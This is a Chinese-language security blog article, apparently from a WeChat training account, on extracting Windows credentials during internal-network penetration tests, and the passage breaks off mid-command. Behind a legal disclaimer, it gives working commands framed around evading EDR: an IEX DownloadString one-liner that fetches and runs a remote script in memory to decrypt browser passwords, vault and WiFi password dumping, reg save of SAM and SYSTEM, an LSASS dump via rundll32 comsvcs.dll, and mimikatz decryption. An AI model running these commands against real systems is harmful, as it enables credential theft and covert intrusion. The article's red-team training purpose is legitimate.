---
title: Windows凭证提取技术
url: https://mp.weixin.qq.com/s/WExm9ZvNeMcnAv__5lIT1Q
source: Doonsec's feed
date: 2026-04-14
fetch_date: 2026-04-15T04:40:00.408148
---

# Windows凭证提取技术

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibzm8nWOdauNGfv5pY99A5OGzxA6A5SkIToLTKquSb0ibT4eFq466XlFwR8tdbloUCkDKASUtLN7ib2LHYegdXqHLia4QgjTuTW1LVhcH2pbIyI/0?wx_fmt=jpeg)

# Windows凭证提取技术

原创

小智
小智

智榜样网络安全学习中心

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 前置合规声明

本文所有内容**仅用于授权范围内的企业内网安全测试、红蓝对抗演练与网络安全人才合规培养**，严格遵循《中华人民共和国网络安全法》《数据安全法》《刑法》第 285/286 条等相关法律法规。严禁将相关技术用于任何未经授权的入侵、攻击、数据窃取、系统破坏等违法违规行为，任何非法获取、泄露、滥用计算机系统凭证的行为，都将承担相应的民事、行政乃至刑事责任。

## 开篇

在内网渗透的全链路里，凭证是贯穿始终的核心。从外网打点拿到的低权限 WebShell，到横向移动打通内网网段，再到最终接管整个域控，整个过程本质上是一场凭证的收集、传递与利用的过程。

很多新手入门内网，总觉得 Mimikatz 是万能的，拿到权限就无脑跑`sekurlsa::logonpasswords`，结果要么被 EDR 当场查杀，要么触发告警被蓝队溯源，甚至操作不当导致目标服务器蓝屏。核心问题从来不是工具不好用，而是没搞懂 Windows 凭证的底层流转逻辑，也没建立起体系化的凭证获取思路。

这篇文章会从 Windows 凭证的底层生成机制讲起，结合时序图拆解核心原理，再按照内网渗透的实战路径，从低权限免杀获取到域环境全域凭证拉取，完整还原我在护网、授权渗透项目中沉淀的全流程操作，同时讲透实战中的对抗思路与避坑经验。

## 一、Windows 凭证的生成与流转逻辑

想要做好凭证获取，首先要搞懂一个核心问题：用户输入密码后，Windows 到底做了什么？凭证最终存在哪里？

Windows 的凭证体系，是围绕「身份认证」这个核心设计的，从用户输入密码的那一刻起，到完成认证、凭证落地存储，整个流程是固定且可拆解的。我用一张时序图，把这个完整流程讲透：

![exported_image (7)](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauPp5xSFM3tdaOYvVJPXx3yr1LpaiaSVBHJpUy6hNksiblgMNegymBWf3IDRjnwMRaKh4cgFu9CZOsA2a0BN1Wf0ge379xr3oz5MA/640?wx_fmt=png&from=appmsg)

exported\_image (7)

从这个流程里，我们能直接提炼出内网渗透中，凭证获取的 4 个核心攻击面，也是所有操作的根本目标：

1、**LSASS 进程内存**：所有登录过的用户凭证（明文密码、NTLM 哈希、Kerberos 票据）都会临时缓存在这里，是全量凭证最核心的攻击点；

2、**SAM 数据库**：本地用户的 NTLM 哈希持久化存储在这里，拿到 SAM 文件就能解密出所有本地用户凭证；

3、**域控 NTDS.dit 数据库**：整个域的所有用户、计算机、凭证信息都存在这里，是域渗透的终极目标；

4、**DPAPI 加密凭证**：浏览器、RDP、WiFi、邮箱等用户凭证，通过 DPAPI 加密存储，低权限下就能解密获取，是实战中最容易出成果的攻击面。

同时我们也能明确一个核心边界：**Windows 对凭证的访问有严格的权限隔离**，不同权限能触达的攻击面天差地别，这也是我们接下来要讲的，凭证获取的权限边界。

## 二、凭证获取的权限边界

在内网渗透里，最忌讳的就是「权限不够，工具来凑」。很多新手拿到一个普通用户的 WebShell，就直接往上丢 Mimikatz，结果不仅执行失败，还触发了 EDR 的异常行为告警。

在我经手的数百个渗透项目里，我始终遵循一个原则：**先匹配当前权限的可操作范围，再选择对应的技术路径，绝不做超出权限边界的无效操作**。Windows 凭证获取的权限边界，分为三个明确的层级：

### 1. 普通用户权限（本地 / 域普通用户）

这是我们外网打点后，最常拿到的初始权限。这个权限下，你无法读取 LSASS 进程内存，也无法访问 SAM 数据库，但依然能拿到大量高价值的横向凭证：

* 当前用户凭据管理器里保存的 RDP、SMB 共享、网站凭证；
* 当前用户的浏览器、邮箱、VPN 客户端保存的明文账号密码；
* 本机连接过的 WiFi 密码；
* 当前用户的 Kerberos 票据，可用于 PTT 票据传递攻击。

这个层级的核心思路是：**用原生工具做免杀无告警操作，优先拿能直接横向的明文凭证，绝不做提权之外的高风险操作**。

### 2. 本地管理员权限

拿到这个权限，就意味着你拥有了单台主机的完整控制权，也是内网横向的核心门槛。这个权限下，你可以：

* 升级到 System 系统权限，读取 LSASS 进程内存，获取本机所有登录过的用户凭证；
* 备份 SAM 数据库，解密所有本地用户的 NTLM 哈希；
* 解密本机所有用户的 DPAPI 加密凭证；
* 读取本机存储的所有 Kerberos 票据。

这个层级的核心思路是：**先升级到 System 权限，再做凭证提取，优先用离线转储的方式规避 EDR 监控，避免直接内存读取触发告警**。

### 3. System 系统权限

Windows 的本地最高权限，也是凭证获取的最优权限。这个权限下，没有任何读取限制，你可以：

* 无阻碍读取 LSASS 进程完整内存，获取全量凭证；
* 直接操作 SAM 数据库、注册表敏感项；
* 域环境下，用域管权限的 System 账号执行 DCSync，拉取整个域的所有用户凭证；
* 解密系统级的 DPAPI 加密凭证。

从本地管理员升级到 System 权限，是凭证获取的前置必备操作，我最常用的是微软原生的 sc 创建服务方式，全 Windows 版本兼容，微软官方签名，99% 的 EDR 不会拦截：

```
sc create SystemCmd binpath= "cmd /c start cmd.exe" type= own type= interact obj= LocalSystem
sc start SystemCmd
```

![image-20260317195234596](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauPCYBnrRvN5B8GTyCAjMczImXXwUdFzcnqJQdocobTreM5ap5WbxTRmeo4ckC1HovKmEyZIrelAKlV8lteSibgHTwV91v37jNpE/640?wx_fmt=png&from=appmsg)

image-20260317195234596

执行后会直接弹出一个 System 权限的 CMD 窗口，全程无第三方工具落地，隐蔽性拉满。

![image-20260317193026133](https://mmbiz.qpic.cn/sz_mmbiz_png/ibzm8nWOdauOJorrTibma1BGoePlcrdyuw1YYvv34GbQRhUqWZ2mfD6CfOgXXy7TQccjcdsEQPoUWgX1LGapFmLibQ1PiarCGmrVOEvB0MTicT0g/640?wx_fmt=png&from=appmsg)

image-20260317193026133

> ❝
>
> Tips：此操作的系统权限cmd不能输入任何命令，因为`type= interact`: 这是一个**过时的**参数，试图让服务允许与桌面交互。本质都是**Windows 会话 0 隔离安全机制**导致的

如何解决？

使用官方`PsExec` 这也是微软官方推荐的、能完美解决这个问题的工具\*\*。它的原理是：

1、它确实会在后台创建一个临时服务。

2、但它会通过内部管道把 SYSTEM 权限的 cmd 的**输入输出流重定向**到你当前的桌面会话（会话 1）。

3、因此你得到的窗口既拥有 SYSTEM 权限，又能正常打字。

下载地址：https://download.sysinternals.com/files/PSTools.zip

```
psexec64 -i -s cmd.exe
```

![image-20260318212438181](https://mmbiz.qpic.cn/sz_mmbiz_png/ibzm8nWOdauOq1YytmVicLdfkNcQThehqiaLbGCUQ6bVq1dYBbEvPcyicXlIOpH7TqPzVRVmgOg9B1SJtCr4jghOMyAfbYopKnpbxNlhJa8I3Sw/640?wx_fmt=png&from=appmsg)

image-20260318212438181

## 三、凭证获取技术详解

接下来的内容，完全按照内网渗透的实战流程推进：从拿到初始普通用户权限的免杀操作，到本地管理员权限的全量凭证提取，再到域环境的全域凭证拉取，完整还原我在项目中的标准操作流程。

### 第一阶段：普通用户权限下的原生免杀凭证获取

在有 EDR 的目标环境里，我从来不会第一时间上工具，优先用系统自带的 LOLBins 原生工具。这些工具都是微软官方签名的白名单文件，不仅全版本兼容，而且几乎不会触发任何告警，是低权限环境下的最优选择。

#### 1. 凭据管理器凭证提取

Windows 凭据管理器会保存用户手动勾选「记住密码」的远程桌面、SMB 共享、网站、FTP 凭证，也是我在低权限环境下，第一个会看的地方 —— 护网项目里，80% 的横向突破都来自这里，很多运维会把域内服务器的 RDP 凭证保存在这里。

```
:: 查看本机保存的所有凭据列表，确认目标地址与用户名
cmdkey /list
:: 读取凭据库完整内容，Win8/2012及以上版本原生支持
vaultcmd /listcreds:"Windows Credentials" /all
```

![image-20260317195344003](https://mmbiz.qpic.cn/sz_mmbiz_png/ibzm8nWOdauPbqpSEPRtg5pVUClYibomQkRqdVtFFm8MxDq2MgWWytoria7zVAYWw2SIa8FY8gMvDRibHGWIjckwhDAVc5JdBJVM0kbYvhhUG0E/640?wx_fmt=png&from=appmsg)

image-20260317195344003

拿到凭据列表后，配合 PowerShell 的 Get-VaultCredential 脚本，无文件内存执行，就能直接解密出明文密码，全程无磁盘落地，普通用户权限即可执行。

#### 2. 浏览器与 DPAPI 凭证解密

绝大多数用户都会在浏览器里保存内网 OA、运维平台、VPN、邮箱的账号密码，这是低权限环境下最容易出成果的地方。Chrome、Edge、Firefox 的凭证，都是用当前用户的 DPAPI 密钥加密的，普通用户权限就能直接解密。

我常用的方式是无文件执行 ChromeDecrypt 脚本，内存中直接解密输出明文凭证，不会留下任何文件痕迹：

```
IEX (New-Object Net.WebClient).DownloadString("https://github.com/thisismyrobot/chrome-decrypt.ps1/blob/master/chrome-decrypt.minified.ps1")
Get-ChromePasswords
```

> ❝
>
> Tips：此处仅作了解，若感兴趣的可以自行Bing搜索

除了浏览器，Outlook、FTP 客户端、VPN 软件的凭证，也都可以用对应的 DPAPI 解密脚本获取，核心逻辑都是一样的：用当前用户的权限，解密当前用户的加密凭证，全程无高风险操作，EDR 基本不会拦截。

#### 3. WiFi 密码提取

这个操作多用于物理渗透、办公终端打点的场景，普通用户权限就能读取当前用户连接过的 WiFi 明文密码，本地管理员权限能读取本机所有保存的 WiFi 密码：

```
:: 查看所有连接过的WiFi名称
netsh wlan show profiles
:: 读取指定WiFi的明文密码
netsh wlan show profile name="目标WiFi名称" key=clear
```

![image-20260317211022912](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauOo8PfWBYkxgBnCaRsZvdateLZiaSDIV4uQjcH3nXAGr9QGFtI22zweE4xLygVsKLnAhnrISHibJl12XQGgbWoOkyqUfnJL1JZz0/640?wx_fmt=png&from=appmsg)

image-20260317211022912

![image-20260317211130187](https://mmbiz.qpic.cn/sz_mmbiz_png/ibzm8nWOdauOme4FBC5o6B6AMiaR7FXZW19pqCpnPDmjNH8ichqqTCRbZQoOY6qYvhe9KSm3cq57FjLPXJamZtg8k201h4wKGJquRPXiaic1wFeI/640?wx_fmt=png&from=appmsg)

image-20260317211130187

### 第二阶段：system权限下的凭证提取

拿到本地管理员权限，并使用**psexec64**升级到 **System** 权限后，我们就可以获取单台主机的全量凭证了。实战中我始终遵循一个原则：**能离线分析的，绝不在线解密；能原生操作的，绝不用第三方工具**，最大程度规避 EDR 的实时监控。

#### 1. SAM 数据库离线解密

SAM 数据库存储了本机所有本地用户的 NTLM 哈希，很多新手会直接去复制`C:\Windows\System32\config\SAM`文件，结果发现文件被系统锁定，根本读不出来。正确的方式是用系统原生的 reg 命令备份，这是系统官方支持的操作，不会被锁定，也几乎不会触发告警：

```
:: 备份SAM和SYSTEM注册表文件，缺一不可
reg save HKLM\SAM C:\Windows\Temp\SAM.bak
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak
```

![image-20260319143659564](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauOOCtzh8FxnwBw53ibNFFWeqicpqhshAfo9GU2bVHkXASGPlvW6oGRhY9qUJsPYzEWxbkoT8WBkU30juoY28oyqibfGKEwjl8IvbQ/640?wx_fmt=png&from=appmsg)

image-20260319143659564

拿到这两个备份文件后，把它们下载到本地离线环境，用 Mimikatz 就能直接解密出所有本地用户的 NTLM 哈希：

```
lsadump::sam /sam:C:\Windows\Temp\SAM.bak /system:C:\Windows\Temp\SYSTEM.bak
```

![image-20260319145427505](https://mmbiz.qpic.cn/sz_mmbiz_png/ibzm8nWOdauMoTtyiahjmASsAolcHdrXgvdKV95icLiaGzReaTxPojMjLcaUmobX53rRibaX721ERzzLSHWfVu2VmvI7JlaCPJnG7FfuQzia99gibs/640?wx_fmt=png&from=appmsg)

image-20260319145427505

整个过程，我们只在目标机上执行了两条原生备份命令，没有任何敏感的解密操作，完美规避了 EDR 对 SAM 文件读取的监控。

#### 2. LSASS 内存离线转储与解密

LSASS 内存是凭证的核心来源，但直接在目标机上读取 LSASS 内存，会被绝大多数 EDR 当场拦截。实战中最优的解决方案，是**原生转储 + 离线解密**：只在目标机上执行内存转储操作，把转储后的 dmp 文件下载到本地，再离线解密凭证，完全规避 EDR 的实时内存监控。

我最常用的是系统原生的 rundll32 调用 comsvcs.dll 转储，全 Windows 版本兼容，原生系统自带，免杀性极强：

```
:: 先获取LSASS进程的PID
tasklist | findstr lsass.exe
```

![image-20260319150658115](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauOKNnYg1hLrw7snN3sGV5xIc5FRcCYvzPzWCkjfM6ibKRDObbSBjf0pETUZp3lTbL4aLnrP3TnFoDkVxZd8EYjmcq7LZg7tjTRQ/640?wx_fmt=png&from=appmsg)

image-20260319150658115

```
:: 用comsvcs.dll完整转储LSASS内存，替换为实际的LSASS进程PID
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 788 C:\Windows\Temp\lsass.dmp full
```

![image-20260319150815618](https://mmbiz.qpic.cn/mmbiz_png/ibzm8nWOdauOH6Kjib2Xt2r7qITbVagGrMSvliaxHiaQ0FVLicvQqOGjEq7R8sHuiatd4QxHrZL4U7pDJPWvuicE9CwxuRaSibqdggbVBTf1T9vZDZc/640?wx_fmt=png&from=appmsg)

image-20260319150815618

拿到 lsass.dmp 文件后，在本地离线环境用 Mimikatz 执行解密，就能拿到所有登录过的用户明文密码、NTLM 哈希、Kerberos 票据：

```
sekurlsa::minidump C:\Windows\Temp\lsass....